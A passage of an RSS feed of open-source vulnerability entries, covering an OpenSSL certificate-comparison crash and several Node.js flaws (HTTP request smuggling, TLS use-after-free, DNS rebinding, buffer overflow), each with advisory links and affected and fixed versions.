href='https://security.netapp.com/advisory/ntap-20240621-0006/'>https://security.netapp.com/advisory/ntap-20240621-0006/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2020/dsa-4807'>https://www.debian.org/security/2020/dsa-4807</a></li><li>- <a target='_blank' href='https://www.openssl.org/news/secadv/20201208.txt'>https://www.openssl.org/news/secadv/20201208.txt</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2020-11'>https://www.tenable.com/security/tns-2020-11</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-09'>https://www.tenable.com/security/tns-2021-09</a></li><li>- <a target='_blank' href='https://www.tenable.com/security/tns-2021-10'>https://www.tenable.com/security/tns-2021-10</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The X.509 GeneralName type is a generic type for representing different types of names. One of those name types is known as EDIPartyName. OpenSSL provides a function GENERAL_NAME_cmp which compares different instances of a GENERAL_NAME to see if they are equal or not. This function behaves incorrectly when both GENERAL_NAMEs contain an EDIPARTYNAME. A NULL pointer dereference and a crash may occur leading to a possible denial of service attack. OpenSSL itself uses the GENERAL_NAME_cmp function for two purposes: 1) Comparing CRL distribution point names between an available CRL and a CRL distribution point embedded in an X509 certificate 2) When verifying that a timestamp response token signer matches the timestamp authority name (exposed via the API functions TS_RESP_verify_response and TS_RESP_verify_token) If an attacker can control both items being compared then that attacker could trigger a crash. For example if the attacker can trick a client or server into checking a malicious certificate against a malicious CRL then this may occur. Note that some applications automatically download CRLs based on a URL embedded in a certificate. This checking happens prior to the signatures on the certificate and CRL being verified. OpenSSL&#x27;s s_server, s_client and verify tools have support for the &quot;-crl_download&quot; option which implements automatic CRL downloading and this attack has been demonstrated to work against those tools. Note that an unrelated bug means that affected versions of OpenSSL cannot parse or construct correct encodings of EDIPARTYNAME. However it is possible to construct a malformed EDIPARTYNAME that OpenSSL&#x27;s parser will accept and hence trigger this attack. All OpenSSL 1.1.1 and 1.0.2 versions are affected by this issue. Other OpenSSL releases are out of support and have not been checked. Fixed in OpenSSL 1.1.1i (Affected 1.1.1-1.1.1h). Fixed in OpenSSL 1.0.2x (Affected 1.0.2-1.0.2w).
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8172: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8172</link>
                    <pubDate>2024-12-16T14:07:16.823Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8172'>https://osv.dev/vulnerability/BIT-node-min-2020-8172</a><br>
                            <b>Published:</b> 2024-12-16T14:07:16.823Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/811502'>https://hackerone.com/reports/811502</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/'>https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20200625-0002/'>https://security.netapp.com/advisory/ntap-20200625-0002/</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujul2020.html'>https://www.oracle.com/security-alerts/cpujul2020.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2020.html'>https://www.oracle.com/security-alerts/cpuoct2020.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>TLS session reuse can lead to host certificate verification bypass in node version &amp;lt; 12.18.0 and &amp;lt; 14.4.0.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8174: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8174</link>
                    <pubDate>2024-12-16T14:07:10.228Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8174'>https://osv.dev/vulnerability/BIT-node-min-2020-8174</a><br>
                            <b>Published:</b> 2024-12-16T14:07:10.228Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/784186'>https://hackerone.com/reports/784186</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201023-0003/'>https://security.netapp.com/advisory/ntap-20201023-0003/</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2020.html'>https://www.oracle.com/security-alerts/cpuoct2020.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>napi_get_value_string_*() allows various kinds of memory corruption in node &amp;lt; 10.21.0, 12.18.0, and &amp;lt; 14.4.0.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8201: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8201</link>
                    <pubDate>2024-12-16T14:07:02.330Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8201'>https://osv.dev/vulnerability/BIT-node-min-2020-8201</a><br>
                            <b>Published:</b> 2024-12-16T14:07:02.330Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html'>http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/922597'>https://hackerone.com/reports/922597</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/'>https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201009-0004/'>https://security.netapp.com/advisory/ntap-20201009-0004/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js &amp;lt; 12.18.4 and &amp;lt; 14.11 can be exploited to perform HTTP desync attacks and deliver malicious payloads to unsuspecting users. The payloads can be crafted by an attacker to hijack user sessions, poison cookies, perform clickjacking, and a multitude of other attacks depending on the architecture of the underlying system. The attack was possible due to a bug in processing of carrier-return symbols in the HTTP header names.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8251: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8251</link>
                    <pubDate>2024-12-16T14:06:53.531Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8251'>https://osv.dev/vulnerability/BIT-node-min-2020-8251</a><br>
                            <b>Published:</b> 2024-12-16T14:06:53.531Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/868834'>https://hackerone.com/reports/868834</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/'>https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201009-0004/'>https://security.netapp.com/advisory/ntap-20201009-0004/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js &amp;lt; 14.11.0 is vulnerable to HTTP denial of service (DoS) attacks based on delayed requests submission which can make the server unable to accept new connections.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8252: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8252</link>
                    <pubDate>2024-12-16T14:06:45.811Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8252'>https://osv.dev/vulnerability/BIT-node-min-2020-8252</a><br>
                            <b>Published:</b> 2024-12-16T14:06:45.811Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html'>http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00011.html</a></li><li>- <a target='_blank' href='http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html'>http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00023.html</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/965914'>https://hackerone.com/reports/965914</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4OOYAMJVLLCLXDTHW3V5UXNULZBBK4O6/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/'>https://nodejs.org/en/blog/vulnerability/september-2020-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202009-15'>https://security.gentoo.org/glsa/202009-15</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20201009-0004/'>https://security.netapp.com/advisory/ntap-20201009-0004/</a></li><li>- <a target='_blank' href='https://usn.ubuntu.com/4548-1/'>https://usn.ubuntu.com/4548-1/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The implementation of realpath in libuv &amp;lt; 10.22.1, &amp;lt; 12.18.4, and &amp;lt; 14.9.0 used within Node.js incorrectly determined the buffer size which can result in a buffer overflow if the resolved path is longer than 256 bytes.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8265: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8265</link>
                    <pubDate>2024-12-16T14:06:36.218Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8265'>https://osv.dev/vulnerability/BIT-node-min-2020-8265</a><br>
                            <b>Published:</b> 2024-12-16T14:06:36.218Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/988103'>https://hackerone.com/reports/988103</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H472D5HPXN6RRXCNFML3BK5OYC52CXF2/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H472D5HPXN6RRXCNFML3BK5OYC52CXF2/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/K4I6MZNC7C7VIDQR267OL4TVCI3ZKAC4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/K4I6MZNC7C7VIDQR267OL4TVCI3ZKAC4/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/january-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/january-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210212-0003/'>https://security.netapp.com/advisory/ntap-20210212-0003/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2021/dsa-4826'>https://www.debian.org/security/2021/dsa-4826</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js versions before 10.23.1, 12.20.1, 14.15.4, 15.5.1 are vulnerable to a use-after-free bug in its TLS implementation. When writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite with a freshly allocated WriteWrap object as first argument. If the DoWrite method does not return an error, this object is passed back to the caller as part of a StreamWriteResult structure. This may be exploited to corrupt memory leading to a Denial of Service or potentially other exploits.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8277: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8277</link>
                    <pubDate>2024-12-16T14:06:26.533Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8277'>https://osv.dev/vulnerability/BIT-node-min-2020-8277</a><br>
                            <b>Published:</b> 2024-12-16T14:06:26.533Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://hackerone.com/reports/1033107'>https://hackerone.com/reports/1033107</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A7WH7W46OZSEUHWBHD7TCH3LRFY52V6Z/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A7WH7W46OZSEUHWBHD7TCH3LRFY52V6Z/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BEJBY3RJB3XWUOJFGZM5E3EMQ7MFM3UT/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/BEJBY3RJB3XWUOJFGZM5E3EMQ7MFM3UT/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EEIV4CH6KNVZK63Y6EKVN2XDW7IHSJBJ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EEIV4CH6KNVZK63Y6EKVN2XDW7IHSJBJ/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VXLJY4764LYVJPC7NCDLE2UMQ3QC5OI2/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VXLJY4764LYVJPC7NCDLE2UMQ3QC5OI2/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/november-2020-security-releases/'>https://nodejs.org/en/blog/vulnerability/november-2020-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202012-11'>https://security.gentoo.org/glsa/202012-11</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuapr2022.html'>https://www.oracle.com/security-alerts/cpuapr2022.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>A Node.js application that allows an attacker to trigger a DNS request for a host of their choice could trigger a Denial of Service in versions &amp;lt; 15.2.1, &amp;lt; 14.15.1, and &amp;lt; 12.19.1 by getting the application to resolve a DNS record with a larger number of responses. This is fixed in 15.2.1, 14.15.1, and 12.19.1.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2020-8287: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2020-8287</link>
                    <pubDate>2024-12-16T14:06:16.624Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2020-8287'>https://osv.dev/vulnerability/BIT-node-min-2020-8287</a><br>
                            <b>Published:</b> 2024-12-16T14:06:16.624Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1002188'>https://hackerone.com/reports/1002188</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2022/12/msg00009.html'>https://lists.debian.org/debian-lts-announce/2022/12/msg00009.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H472D5HPXN6RRXCNFML3BK5OYC52CXF2/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/H472D5HPXN6RRXCNFML3BK5OYC52CXF2/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/K4I6MZNC7C7VIDQR267OL4TVCI3ZKAC4/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/K4I6MZNC7C7VIDQR267OL4TVCI3ZKAC4/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/january-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/january-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202101-07'>https://security.gentoo.org/glsa/202101-07</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210212-0003/'>https://security.netapp.com/advisory/ntap-20210212-0003/</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2021/dsa-4826'>https://www.debian.org/security/2021/dsa-4826</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpujan2021.html'>https://www.oracle.com/security-alerts/cpujan2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js versions before 10.23.1, 12.20.1, 14.15.4, 15.5.1 allow two copies of a header field in an HTTP request (for example, two Transfer-Encoding header fields). In this case, Node.js identifies the first header field and ignores the second. This can lead to HTTP Request Smuggling.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22883: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22883</link>
                    <pubDate>2024-12-16T14:06:06.630Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22883'>https://osv.dev/vulnerability/BIT-node-min-2021-22883</a><br>
                            <b>Published:</b> 2024-12-16T14:06:06.630Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1043360'>https://hackerone.com/reports/1043360</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/E4FRS5ZVK4ZQ7XIJQNGIKUXG2DJFHLO7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/E4FRS5ZVK4ZQ7XIJQNGIKUXG2DJFHLO7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F45Y7TXSU33MTKB6AGL2Q5V5ZOCNPKOG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F45Y7TXSU33MTKB6AGL2Q5V5ZOCNPKOG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSYFUGKFUSZ27M5TEZ3FKILWTWFJTFAZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSYFUGKFUSZ27M5TEZ3FKILWTWFJTFAZ/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210416-0001/'>https://security.netapp.com/advisory/ntap-20210416-0001/</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 10.24.0, 12.21.0, 14.16.0, and 15.10.0 is vulnerable to a denial of service attack when too many connection attempts with an &#x27;unknownProtocol&#x27; are established. This leads to a leak of file descriptors. If a file descriptor limit is configured on the system, then the server is unable to accept new connections and prevent the process also from opening, e.g. a file. If no file descriptor limit is configured, then this lead to an excessive memory usage and cause the system to run out of memory.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22884: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22884</link>
                    <pubDate>2024-12-16T14:05:57.334Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22884'>https://osv.dev/vulnerability/BIT-node-min-2021-22884</a><br>
                            <b>Published:</b> 2024-12-16T14:05:57.334Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1069487'>https://hackerone.com/reports/1069487</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/E4FRS5ZVK4ZQ7XIJQNGIKUXG2DJFHLO7/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/E4FRS5ZVK4ZQ7XIJQNGIKUXG2DJFHLO7/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F45Y7TXSU33MTKB6AGL2Q5V5ZOCNPKOG/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/F45Y7TXSU33MTKB6AGL2Q5V5ZOCNPKOG/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSYFUGKFUSZ27M5TEZ3FKILWTWFJTFAZ/'>https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HSYFUGKFUSZ27M5TEZ3FKILWTWFJTFAZ/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/february-2021-security-releases/</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/march-2018-security-releases/#node-js-inspector-dns-rebinding-vulnerability-cve-2018-7160'>https://nodejs.org/en/blog/vulnerability/march-2018-security-releases/#node-js-inspector-dns-rebinding-vulnerability-cve-2018-7160</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210416-0001/'>https://security.netapp.com/advisory/ntap-20210416-0001/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210723-0001/'>https://security.netapp.com/advisory/ntap-20210723-0001/</a></li><li>- <a target='_blank' href='https://www.oracle.com//security-alerts/cpujul2021.html'>https://www.oracle.com//security-alerts/cpujul2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuApr2021.html'>https://www.oracle.com/security-alerts/cpuApr2021.html</a></li><li>- <a target='_blank' href='https://www.oracle.com/security-alerts/cpuoct2021.html'>https://www.oracle.com/security-alerts/cpuoct2021.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 10.24.0, 12.21.0, 14.16.0, and 15.10.0 is vulnerable to DNS rebinding attacks as the whitelist includes “localhost6”. When “localhost6” is not present in &#x2F;etc&#x2F;hosts, it is just an ordinary domain that is resolved via DNS, i.e., over network. If the attacker controls the victim&#x27;s DNS server or can spoof its responses, the DNS rebinding protection can be bypassed by using the “localhost6” domain. As long as the attacker uses the “localhost6” domain, they can still apply the attack described in CVE-2018-7160.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22918: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22918</link>
                    <pubDate>2024-12-16T14:05:47.622Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22918'>https://osv.dev/vulnerability/BIT-node-min-2021-22918</a><br>
                            <b>Published:</b> 2024-12-16T14:05:47.622Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf'>https://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/1209681'>https://hackerone.com/reports/1209681</a></li><li>- <a target='_blank' href='https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/'>https://nodejs.org/en/blog/vulnerability/july-2021-security-releases/</a></li><li>- <a target='_blank' href='https://security.gentoo.org/glsa/202401-23'>https://security.gentoo.org/glsa/202401-23</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20210805-0003/'>https://security.netapp.com/advisory/ntap-20210805-0003/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Node.js before 16.4.1, 14.17.2, 12.22.2 is vulnerable to an out-of-bounds read when uv__idna_toascii() is used to convert strings to ASCII. The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo().
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-node-min-2021-22921: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-node-min-2021-22921</link>
                    <pubDate>2024-12-16T14:05:37.425Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-node-min-2021-22921'>https://osv.dev/vulnerability/BIT-node-min-2021-22921</a><br>
                            <b>Published:</b> 2024-12-16T14:05:37.425Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
